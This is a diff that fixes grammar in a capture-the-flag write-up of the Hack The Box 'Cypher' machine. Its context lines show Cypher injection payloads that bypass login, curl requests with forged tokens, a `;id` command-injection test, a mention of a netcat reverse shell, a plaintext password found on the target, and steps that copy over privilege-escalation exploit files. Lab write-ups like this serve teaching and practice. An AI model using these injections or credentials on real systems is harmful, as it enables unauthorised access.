@@ -6,7 +6,7 @@
 
 "Cypher" was an interesting box that blended **web exploitation**, **graph database query injection**, and **privilege escalation through a misconfigured tool**.  
 
-The initial foothold came from **Cypher Injection** in the login API, which allowed forging a successful login by injecting a crafted query that returned a valid hash. 
+The initial foothold was established through **Cypher Injection** in the login API, which enabled forging a successful login by injecting a crafted query that returned a valid hash.
 
 After gaining access, I discovered custom Neo4j procedures implemented in a Java JAR file, one of which was vulnerable to **command injection**. This gave me a shell as the `neo4j` user.  
 
@@ -146,7 +146,7 @@ In cybersecurity, ignorance works the same way. Ignoring vulnerabilities may fee
 <!-- "what is the acceptable amount of suffering, is the question." -TheFunky1 -->
 ```
 
-I attempted to login with the credentials `admin:admin`.
+I attempted to log in with the credentials `admin:admin`.
 
 ![](images/Pasted%20image%2020250716191124.png)
 
@@ -163,8 +163,8 @@ fcoomans@kali:~/htb/cypher$ curl -s -X POST -H 'Content-Type: application/json' 
 
 #### 💡Cypher queries discovered
 
-Attempting an SQLi with payload `admin'` for the `username` parameter reveals that the site is actually using Cypher queries.
-This immediately reminded me of the queries in BloodHound as that program also uses Cypher for its queries.
+Attempting an SQLi with payload `admin'` for the `username` parameter reveals that the site is actually Cypher queries.
+This immediately reminded me of the queries in BloodHound, as that program also uses Cypher for its queries.
 
 ```
 fcoomans@kali:~/htb/cypher$ curl -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"admin'\",\"password\":\"admin\"}" http://cypher.htb/api/auth
@@ -230,10 +230,10 @@ MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as h
 ```
 
 Sending the payload `admin' OR true RETURN u.name//`: 
-- the first part is similar to `admin' OR 1=1` in SQLi which will always be true and allow login.
-- the second part will return the username and not the password hash as expected.  The payload ends with `//` to comment out the remaining query.
+- The first part is similar to `admin' OR 1=1` in SQLi, which will always be true and allow login.
+- The second part will return the username and not the password hash as expected.  The payload ends with `//` to comment out the remaining query.
 
-After the injection the query on the server will look like this:
+After the injection, the query on the server will look like this:
 
 ```cypher
 MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR true RETURN u.name//' return h.value as hash
@@ -261,7 +261,7 @@ ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.n
 KeyError: 'hash'
 ```
 
-The cypher query shown that shown also tells me that the password hash is a simple `sha1` hash.
+The cypher query shown also tells me that the password hash is a simple `sha1` hash.
 
 ```cypher
 MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR true RETURN u.name//' return h.value as hash
@@ -317,14 +317,14 @@ fcoomans@kali:~/htb/cypher$ curl -v -s -X POST -H 'Content-Type: application/jso
 ok
 ```
 
-I open Developer Tools and add manually add the cookie to the site cookies.
+I opened Developer Tools and manually added the cookie to the site cookies.
 
 ![](images/Pasted%20image%2020250716192641.png)
 
 ### 💰 Post Exploitation
 
 Refreshing the page shows that Cypher queries can now be run on the website.
-Selecting the `Selct All` query shows the query and the results in JSON and graph format.
+Selecting the `Select All` query shows the query and the results in JSON and graph format.
 
 ![](images/Pasted%20image%2020250716192806.png)
 
@@ -372,7 +372,7 @@ fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI
 <SNIP>
 ```
 
-This is proven, by comparing the `HelloWorldProcedure` name and description as seen in `jd-gui` with the server response.
+This is confirmed, by comparing the `HelloWorldProcedure` name and description as seen in `jd-gui` with the server response.
 
 ![](images/Pasted%20image%2020250716193606.png)
 
@@ -385,7 +385,7 @@ CALL custom.helloWorld('Frans')
 
 ![](images/Pasted%20image%2020250716193846.png)
 
-Sending the URL encoded query to the server shows the response which correlates with the source code from the JAR file.
+Sending the URL-encoded query to the server shows the response, which correlates with the source code from the JAR file.
 
 ```
 fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM' "http://cypher.htb/api/cypher?query=CALL%20custom.helloWorld('Frans')" |jq
@@ -396,13 +396,13 @@ fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI
 ]
 ```
 
-The `url` parameter from the `custom.getUrlStatusCode` procedure is not sanitized and can be used for command-injection.
+The `url` parameter from the `custom.getUrlStatusCode` procedure is not sanitized and can be used for command injection.
 
 ![](images/Pasted%20image%2020250716194000.png)
 
 ### 🧪 Exploitation
 
-To test this I send the payload `;id` as the URL to be checked.
+To test this, I sent the payload `;id` as the URL parameter value.
 
 ```cypher
 CALL custom.getUrlStatusCode(';id')
@@ -421,8 +421,8 @@ fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI
 
 #### 👣 Foothold as neo4j
 
-I use https://www.revshells.com to generate a `nc mkfifo` reverse shell, that will give me a `bash` shell on the target.
-The reverse shell payload is also URL Encoded.
+I use https://www.revshells.com to generate a `nc mkfifo` reverse shell, which will give me a `bash` shell on the target.
+The reverse shell payload is also URL encoded.
 
 ![](images/Pasted%20image%2020250716194352.png)
 
@@ -456,7 +456,7 @@ uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
 
 #### 🔼 Priv Esc to graphasm
 
-During system enumeration I find that the `/home/graphasm/bbot_preset.yml` configuration file contains a password for the `neo4j` user.
+During system enumeration, I find that the `/home/graphasm/bbot_preset.yml` configuration file contains a password for the `neo4j` user.
 The password is `cU4btyib.20xtCMCXkBmerhK`.
 
 ```
@@ -555,7 +555,7 @@ remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
 Receiving objects: 100% (5/5), done.
 ```
 
-I copy the exploit files `systeminfo_enum.py` and `preset.yml` to `/dev/shm` on the target.
+I copied the exploit files `systeminfo_enum.py` and `preset.yml` to `/dev/shm` on the target.
 
 ```
 fcoomans@kali:~/htb/cypher/bbot-privesc$ scp systeminfo_enum.py graphasm@cypher.htb:/dev/shm/
